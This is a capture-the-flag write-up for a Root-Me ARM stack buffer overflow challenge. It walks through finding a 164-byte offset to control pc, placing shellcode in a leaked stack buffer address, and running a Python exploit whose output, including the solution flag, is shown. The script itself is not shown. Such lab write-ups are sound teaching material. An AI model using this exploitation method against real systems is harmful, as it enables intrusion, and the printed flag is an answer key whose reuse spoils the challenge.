# ELF ARM - Stack buffer overflow - basic
https://www.root-me.org/en/Challenges/App-System/ELF-ARM-Stack-buffer-overflow-basic
```
Conquer the binary to read the .passwd file.

PIE	    Position Independent Executable	          No        
RelRO	    Read Only relocations	                  Yes
NX	    Non-Executable Stack	                  No
ASLR	    Address Space Layout Randomization	          Yes
SF	    Source Fortification	                  No
SSP	    Stack-Smashing Protection	                  No
SRC	    Source code access	                          No

Challenge connection informations :

Host	            challenge04.root-me.org
Protocol	    TCP
Port	            61045
SSH access	    ssh -p 2224 app-systeme-ch45@challenge04.root-me.org
Username	    app-systeme-ch45
Password	    app-systeme-ch45
```

First, in order to plan how to solve this challenge, let's check the files and their permissions:
```bash
app-systeme-ch45@challenge04:~$ ll
total 44
drwxr-x---  2 app-systeme-ch45-cracked app-systeme-ch45 4096 Apr  7  2018 .
drwxr-xr-x 13 root                     root             4096 Mar 17  2018 ..
-r-xr-x---  1 app-systeme-ch45-cracked app-systeme-ch45 8296 May 19  2017 ch45
-r--------  1 app-systeme-ch45-cracked app-systeme-ch45  577 May 19  2017 ch45.c
-r--------  1 root                     root               46 Apr  7  2018 ._firewall
-r--------  1 root                     root              795 May 19  2017 Makefile
-rw-r-----  1 app-systeme-ch45-cracked app-systeme-ch45  306 May 19  2017 .motd
-r--------  1 app-systeme-ch45-cracked app-systeme-ch45   33 May 19  2017 .passwd
-rw-r-----  1 app-systeme-ch45-cracked app-systeme-ch45  516 May 19  2017 xinetd-app-systeme-ch45.conf
```

Next, let's check the ```xinetd-app-systeme-ch45.conf``` file:
```bash
service app-systeme-ch45
{
       flags                   = IPv6
       instances               = 50
       disable                 = no
       port                    = 61045
       socket_type             = stream
       protocol                = tcp
       wait                    = no
       user                    = app-systeme-ch45-cracked
       server                  = /usr/bin/timeout
       server_args             = -k1m 1m /challenge/app-systeme/ch45/ch45
       type                    = UNLISTED
}
```

So the plan is to overflow the stack using the remote service (in port 61045), in order to run a shell under _app-systeme-ch45-cracked_ permissions, which will display the file's content.<br>

If we'll execute the binary, it will display the following output:
```bash
app-systeme-ch45@challenge04:~$ ./ch45
Give me data to dump:
1234567890
0xbedd5ae8:  31 32 33 34 35 36 37 38 39 30
Dump again (y/n):
y                
Give me data to dump:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0xbedd5ae8:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5af8:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b08:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b18:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b28:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b38:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b48:  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
0xbedd5b58:  61 61 61 61 61
Dump again (y/n):
n
```

Ok. So, probably we'll be able to override a _lr_ value (or something like that) in the stack.<br>
Luckily, most of the function prologs pushing the _lr_ value, in order to call other functions. And most of the function epilogues popping it back.<br>
So, because there are calls to _scanf_ and _printf_ in the main function, the function's prolog should push the _lr_ value, and the function's epilogue should pop it, and put it in _pc_.<br>
In fact, the **main** function does it:
```asm
103d8:	e3012008 	movw	r2, #4104	; 0x1008
103dc:	e3402002 	movt	r2, #2
103e0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
[...snip...]
104fc:	e8bd8ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, pc}
```

Nice. So we've got a plan - override the _lr_ value pushed at the beginning of the function with an address to our shellcode, and then stop the execution (by not wanting to dump again). Then, our address will be popped to _pc_.<br><br>

After few tries, the following string gave this information:
```gdb
Give me data to dump:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD
0xbefffab8:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffac8:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffad8:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffae8:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffaf8:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb08:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb18:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb28:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb38:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb48:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0xbefffb58:  41 41 41 41 44 44 44 44
Dump again (y/n):
n

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
Awesome! so we can control the _pc_ value at the end of the **main** function (it seems to be at offset of 164 bytes).<br>
Now, we'll need a place to store how shellcode.<br>
In each run, the program will show the address of the input buffer. Because the _NX_ is not set, and the address remains the same as long as the process still runs, it looks like a nice and warm place to put our shellcode.<br><br>
So, basically we'll have to follow the following steps:
<ol>
  <li>Leak the address by inserting a simple input (e.g "A").</li>
  <li>Build a shellcode which will <i>cat</i> the file's content, and override the <i>lr</i> value with the buffer's address.</li>
  <li>Watch the magic happens.</li>
</ol>
<br>

So, I wrote a python3 script which will do it. It's output is:
```sh
[!] Shellcode's length: 80.
[+] Starting communicating with the service.
[+] Found stack offset - 0xbee0fc58.
[+] Preparing the shellcode
[+] The shellcode sent to the remote service.
[+] Flag: 0v3rfl0wing_buff3rs_l1k3_4_b0ss!.
```
